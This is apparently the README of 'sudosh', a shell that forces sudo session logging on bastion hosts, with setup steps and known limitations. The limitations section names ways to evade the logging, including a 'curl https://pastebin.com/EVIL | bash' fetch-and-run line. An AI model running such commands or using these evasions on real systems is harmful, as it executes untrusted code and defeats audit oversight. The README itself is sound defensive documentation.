## Introduction

The `sudo` command provides built-in session logging. 
Combined with [`sudoreplay`](https://www.sudo.ws/man/1.8.13/sudoreplay.man.html) 
it provides an easy way to review session logs on a 
[bastion](https://github.com/cloudposse/bastion/) host. 
When used as a system login shell, it will force session logging.

[Another common pattern](https://aws.amazon.com/blogs/security/how-to-record-ssh-sessions-established-through-a-bastion-host/) 
is to use the OpenSSH `ForceCommand` directive in `sshd_config` combined with the `script` command to log sessions. 
This is ineffective because the [user can easily bypass](http://serverfault.com/a/639814) it.  
Using `sudosh` provides a more secure alternative that cannot be bypassed since it does not depend on `ForceCommand`.

## Usage



Here's how to use it in 3 easy steps. 
Checkout the [precompiled releases](https://github.com/cloudposse/sudosh/releases) 
if you don't want to build it yourself...:

1. Enable `sudo` logging. Edit `/etc/sudoers.d/sudosh`:

  ```
  Defaults log_output requiretty
  Defaults!/usr/bin/sudoreplay !log_output
  Defaults!/sbin/reboot !log_output
  ```

2. Add this command to `/etc/shells`:

  ```
  /usr/bin/sudosh
  ```

  **Tip**: to prevent users from using other shells to login, remove those shells from `/etc/shells`.


3. Update the user `foobar` to use the `sudosh` shell. 

  ```
  chsh -s /usr/bin/sudosh foobar
  echo 'foobar ALL=(foobar) ALL' > /etc/sudoers.d/sudosh-foobar
  ```
  **NOTE:** filenames in `sudoers.d` cannot contain the `.` character


## Known Limitations

* Without `requiretty` users can easily circumvent logging of `stdin` by running `ssh user@host bash`. 
* Using `requiretty`, will require passing a pseudo TTY, which is easily accomplished by instead running `ssh -tt user@host bash`
* Users can easily circumvent logging of `stdin` by running `stty -echo`, however, you'll see the command run to disable it. =)
* Users can easily run scripts (e.g. `curl https://pastebin.com/EVIL | bash`) which would circumvent the ability to see what was executed
* There are 1000+ ways bad actors can circumvent *any* form of TTY logging. 
* Using this method of session logging only recommended to keep an *honest* log of what happened.
* Capturing a byte-for-byte session log requires extension of the SSH server or perhaps a custom shell built specificically for that purpose.
